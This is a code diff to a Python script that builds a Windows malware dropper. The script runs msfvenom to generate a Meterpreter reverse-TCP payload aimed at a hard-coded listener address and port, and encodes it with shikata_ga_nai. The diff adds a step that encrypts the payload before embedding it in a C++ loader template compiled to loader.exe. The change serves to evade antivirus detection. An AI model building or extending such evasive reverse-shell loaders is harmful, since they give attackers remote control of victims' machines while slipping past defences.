@@ -1,4 +1,5 @@
 from insert_code import insert_payload
+from encrypt import encrypt
 import subprocess as sb
 
 LHOST = '192.168.100.1'
@@ -6,6 +7,8 @@ LHOST = '192.168.100.1'
 LPORT = '6942'
 
 RAW_CODE_FILE = 'reverse_tcp_raw.txt'
+
+ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.txt'
 
 LOADER_TEMPLATE = 'payload_deployer.cpp.template'
 
@@ -16,25 +19,25 @@ LOADER_EXE = 'loader.exe'
 print('Creating payload using msfvenom...')
 
 payload_creator = sb.Popen(["msfvenom",
-                            "-p",
-                            "windows/x64/meterpreter_reverse_tcp",
-                            "-e",
-                            "x86/shikata_ga_nai",
+                            "-p", "windows/x64/meterpreter_reverse_tcp",
+                            "-e", "x86/shikata_ga_nai",
                             "-i", "2",
                             f'LHOST={LHOST}',
                             f'LPORT={LPORT}',
-                            "-f",
-                            "raw",
-                            "-o",
-                            RAW_CODE_FILE])
+                            "-f", "raw",
+                            "-o", RAW_CODE_FILE])
 
 if payload_creator.wait() != 0:
     print('Error creating MSF payload')
     exit(-1)
 
+print('Encrypting payload...')
+
+encrypt(RAW_CODE_FILE, ENCRYPTED_CODE_FILE, 'x')
+
 print('Inserting payload into loader...')
 
-insert_payload(RAW_CODE_FILE, LOADER_TEMPLATE, GEN_CODE)
+insert_payload(ENCRYPTED_CODE_FILE, LOADER_TEMPLATE, GEN_CODE)
 
 print('Compiling generated code...')
 
